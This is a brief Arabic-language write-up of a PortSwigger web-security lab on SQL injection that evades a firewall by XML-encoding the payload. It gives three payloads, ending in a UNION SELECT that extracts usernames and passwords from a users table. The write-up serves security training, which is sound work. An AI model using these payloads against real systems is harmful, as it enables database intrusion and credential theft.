# Lab: SQL injection with filter bypass via XML encoding

[https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

- الفكره من الLab ده ان تحاول تضحك علي firewall وتاخد البيانات من XML عن طريق حقنه بس خلي بالك علشان الfirewall مش هتعرف تدخله الكود صريح
- هتحتاج تعمله encode يدوي او بستخدام ادوات ذي Hackvertor
- لو هتعمل encode هيبقي لواحد م الاتنين دول <@hex_entities>  او  <@xml_entities>

```bash
1. <productId>6+7</productId> => show different behavior 

2. <@hex_entities>2 UNION SELECT NULL</@hex_entities

3. <@hex_entities>1 UNION SELECT username||'~'||password FROM users--</@hex_entities>
```
